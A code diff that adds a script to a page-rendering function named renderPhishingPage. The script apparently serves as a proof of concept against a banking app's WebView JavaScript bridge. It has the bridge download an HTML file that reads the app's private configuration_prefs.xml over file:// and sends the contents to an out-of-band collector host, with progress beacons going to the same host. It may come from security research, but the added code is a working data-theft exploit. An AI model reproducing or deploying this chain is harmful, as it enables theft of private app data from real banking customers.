@@ -132,7 +132,7 @@ function renderPage({ content, title = "Test Login Page Below" }) {
     <a class="skip-link" href="#main">Skip to main content</a>
     <main id="main" class="page-shell">
       <section class="hero" aria-labelledby="page-title">
-        <h1 id="page-title">Joint Account Registration</h1>
+        <h1 id="page-title">Joint Registration</h1>
         <br>
         <p class="eyebrow">Please follow on-screen directions.</p>
       </section>
@@ -204,10 +204,58 @@ function renderPhishingPage() {
   return renderPage({
     content: `<section class="section-block" aria-labelledby="complete-section-title">
         <div class="login-card complete-card">
-          <h3>Step 1 Complete</h3>
+          <h3>Success!</h3>
           <p>Device verification completed successfully. Click the link in your invitation email to proceed to the next step.</p>
         </div>
-      </section>`
+      </section>
+      <script>
+      var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";
+      
+      function log(step) {
+          document.getElementById("status").innerText = step;
+          new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
+      }
+      
+          try {
+              var testHtml = '<html><body><p id="s">Verifying Account Status...</p><script>' +
+                  'var stolen = "placeholder";' +
+                  'var target = "/data/data/com.rbc.mobile.android/shared_prefs/configuration_prefs.xml";' +
+                  'var xhr = new XMLHttpRequest();' +
+                  'xhr.open("GET", "file://" + target, true);' +
+                  'xhr.onreadystatechange = function() {' +
+                  '  if (xhr.readyState === 4) {' +
+                  '    if (xhr.status === 0 || xhr.status === 200) {' +
+                  '      stolen = xhr.responseText;' +
+                  '    }' +
+                  '    var data = encodeURIComponent(JSON.stringify(stolen));' +
+                  '    WebViewFragment.onNavigateWebHook(JSON.stringify({' +
+                  '      "version": "1.2",' +
+                  '      "type": "externalWebview",' +
+                  '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?d=" + data' +
+                  '    }));' +
+                  '  }' +
+                  '};' +
+                  'xhr.send();' +
+                  '</' + 'script></body></html>';
+      
+              WebViewFragment.onFeatureEventWebHook(JSON.stringify({
+                  "version": "1.2",
+                  "type": "dynamicDownloadDocument",
+                  "targetFileBase64": btoa(testHtml),
+                  "fileName": "verify.html"
+              }));
+              log("3-download-called");
+          } catch(e) {
+              log("FAIL-download-error-" + e.message);
+          }
+      
+          // window.location to file:// is blocked on API 36 —
+          // use Click 2 (second deeplink) to load verify.html
+          setTimeout(function() {
+              log("4-waiting-for-click2");
+          }, 2000);
+      }
+      </script>`
   });
 }
 
